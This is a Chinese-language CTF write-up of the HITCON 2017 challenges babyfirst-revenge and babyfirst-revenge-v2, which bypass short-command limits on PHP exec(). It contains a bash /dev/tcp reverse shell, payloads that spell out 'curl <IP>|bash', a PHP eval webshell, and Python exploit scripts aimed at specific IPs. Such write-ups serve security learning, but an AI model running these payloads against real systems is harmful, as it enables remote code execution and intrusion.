# 前言

HITCON2017学习记录



# babyfirst-revenge

## 预期解

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

创建一个IP沙盒，在这个沙盒中执行`exec()`，这里限制了shell只能是5个字符，所以将shell写到文件名，然后使用`\`进行拼接



主要思路就是在vps上的index.html挂一个反弹shell的命令

```
bash -i >& /dev/tcp/vps的ip/8888 0>&1
```

然后我们监听8888端口。

这里的`exec()`要执行的是

`curl vps的ip|bash`

用上面的方法，我们可以把命令写入一个bash脚本中，之后运行该bash脚本。

```php
ls -t>g

>ls\\
ls>_
>\ \\
>-t\\
>\>g
ls>>_

curl 106.15.250.162|bash
>sh
>ba\\
>\|\\
>2\\
>16\\
>0.\\
>25\\
>5.\\
>1\\
>6.\\
>10\\
>\ \\
>rl\\
>cu\\

sh _
sh g
```

按照这个顺序通过cmd传入，前一部分是将`ls -t>g`写入`_`，接着一顿操作，执行`sh _`，会将文件名按写入时间顺序写入`g文件`，然后`sh g`执行bash指令，getshell。

脚本实现

```python
import requests
from time import sleep
from urllib import quote

payload = [
    # generate `ls -t>g` file
    '>ls\\', 
    'ls>_', 
    '>\ \\', 
    '>-t\\', 
    '>\>g', 
    'ls>>_', 

    # generate `curl orange.tw.tw|python`
    # generate `curl 10.188.2.20|bash` 
    '>sh', 
    '>ba\\', 
    '>\|\\',
    '>2\\',
    '>16\\', 
    '>0.\\',
    '>25\\', 
    '>5.\\', 
    '>1\\',
    '>6.\\',
    '>10\\',
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 

    # exec
    'sh _', 
    'sh g', 
]



r = requests.get('http://117.50.3.97:8001/?reset=1')
for i in payload:
    r = requests.get('http://117.50.3.97:8001/?cmd=' + quote(i) )
    print i
    sleep(0.2)
    
```

```mysql
mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e 'use fl4gdb;select * from this_is_the_fl4g;'
```

连接数据库获得flag



## 非预期解

这个预期解，我没有复现成功，也不知道为什么，我一直都读不到IP沙箱的文件夹，但还是记录一下这个思路。

首先在VPS的`index.html`上挂一个

```php
echo "<?php eval(\$_REQUEST['XXXX']);?>" > /www/sandbox/md5('orange'+$_SERVER[REMOTE_ADDR])/2.php
```

接着执行

```php
curl vps>1
```

实际上这一步和预期解的解法是一样的。

那也就是将vps上的内容写入文件1，然后执行文件1

我写的脚本

```php
import requests
from time import sleep
from urllib import quote

payload = [
    # generate `ls -t>g` file
    '>ls\\', 
    'ls>_', 
    '>\ \\', 
    '>-t\\', 
    '>\>g', 
    'ls>>_', 

    # generate `curl 106.15.250.162>1` 
    '>\>1',
    '>2\\',
    '>16\\',
    '>0.\\',
    '>25\\',
    '>5.\\',
    '>1\\',
    '>6.\\',
    '>10\\',
    '>\ \\',
    '>rl\\',
    '>cu\\',

    # exec
    'sh _', 
    'sh g', 
    'sh 1'
]

r = requests.get('http://117.50.3.97:8001/?reset=1')
for i in payload:
    r = requests.get('http://117.50.3.97:8001/?cmd=' + quote(i) )
    print i
    sleep(0.2)
```











# babyfirst-revenge-v2

先来普及一下这道题需要用到的小知识

（１）`*` 相当于`$(dir *)`,所以说如果文件名如果是命令的话就会返回执行的结果,之后的作为参数传入.

​          

　　　`passwd` 里的内容是`hello world`。

（２）dir指令和ls指令的功能相同，都是以**字典序将所在目录下的文件名输出**；

（３）rev指令可以将某一文件内容以倒序输出。



然后看一下这道题，代码如下

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

因为这里将`cmd`的长度限制到４个字符。所以第一题的`ls -t>a`那个做法就不可行了。

所以这里使用另外一个方法写入`ls -t>a`,payload如下：

```php
	payload = [
				'>dir',        #这里要用dir，而不是ls，因为ls在sl ht- g>四个文件名中不能排在第一个
				'>sl',
				'>ht-',       #使用h参数，是为了使得按照字典序输出的结果是我们想要的
				'>g\>',
				'*>v',      #v:g> ht- sl
         #拼在一起之后是dir g> ht -sl，这并不是一条正确的语句，但是会执行dir，并将结果输出到v文件中
				'>rev',
				'*v>x',        #rev v,then v:ls -th >g

				'>ash',
	            '>b\\',
	            '>\|\\',
	            '>82\\',
	            '>1:\\',
	            '>7.\\',
	            '>24\\',
	            '>8.\\',
	            '>16\\',
	            '>2.\\',
	            '>19\\',   #这里所使用的ip也有一定讲究，需要构成不重复的多个文件名
	            '>\ \\',
	            '>rl\\',
	            '>cu\\',
	            'sh x',   #execute ls -th >g
	            'sh g'
	]
```

`*>v`实际上上可以转换成`$(dir *)>v`，所以写入`v`的文件如下：`ls -th >g`

然后文件名加一个`rev`，之后`*v>x`实际上就是`$(dir *v)>x`，**dir *v返回的就是结尾为v的文件**，写入`x`文件

那么rev和v都是以v结尾的文件。

exp:

```python
import requests
import urllib
from time import sleep

payload = [
	
	'>dir',
	'>sl',
	'>g\>',
	'>ht-',
	'*>v',
	'>rev',
	'*v>u',

	'>sh',
	'>ba\\',
	'>\|\\',
	'>2\\',
	'>16\\',
	'>0.\\',
	'>25\\',
	'>5.\\',
	'>1\\',
	'>6.\\',
	'>10\\',
	'>\ \\',
	'>rl\\',
	'>cu\\',

	'sh u',
	'sh g'
]

r = requests.get("http://117.50.3.97:8002?reset=1")
for i in payload:
	r = requests.get("http://117.50.3.97:8002?cmd="+urllib.quote(i))
	print i
	sleep(0.2)
```

关于为啥这里的shell是五个字符却符合要求，问python...

